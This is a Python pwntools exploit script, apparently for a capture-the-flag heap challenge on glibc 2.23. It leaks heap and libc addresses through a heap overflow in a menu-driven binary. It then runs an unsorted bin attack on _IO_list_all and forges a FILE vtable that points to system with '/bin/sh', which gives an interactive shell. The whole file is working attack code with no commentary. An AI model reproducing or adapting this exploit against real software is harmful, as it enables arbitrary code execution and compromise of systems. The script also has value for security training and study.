#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./ttt"
libc_binary = "/home/zh1x1an/src/glibc-2.23/64/lib/libc-2.23.so"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Size:",str(length))

def free(idx):
    opt(2)
    p.sendlineafter("Index:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Size:",str(length))
    p.sendlineafter("Data:",str(content))

def show(idx):
    opt(4)
    p.sendlineafter("Index:",str(idx))

# leak heap base
p.sendlineafter("Name:","a"*0x20)
add(0x80,"a"*8) # 0
show(0)
p.recvuntil("Name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
heap_addr = u64(p.recv(3).ljust(8,"\0")) - 0x10
log.success("heap_addr is -> "+ hex( heap_addr ))

# leak libc addr
add(0x80,"a"*8) # 1
add(0x80,"a"*8) # 2
free(1)
edit(0,0x90,"a"*(0x90-2)+"zx")
show(0)
p.recvuntil("aazx")
libc_addr = u64(p.recv(6).ljust(8,"\0")) - 0x389b78 # ./main_arena libc + 88
log.success("libc_addr is -> "+ hex( libc_addr ))

# unsorted bin attack
fd = 0
bk = libc_addr + 0x38a520 - 0x10 # _IO_list_all
payload = flat([
    "a"*0x80,"/bin/sh\x00",0x61,fd,bk,0,1
    ])

edit(0,0x200,payload)
vtable = heap_addr + 0x170
system_addr = libc_addr + libc.sym["system"]
edit(2,0x100,"\x00"*0x38+p64(vtable) + "b"*0x18 + p64(system_addr))

add(0x80,"a")

gdb.attach(p,"set $h=0x603000")
p.interactive()
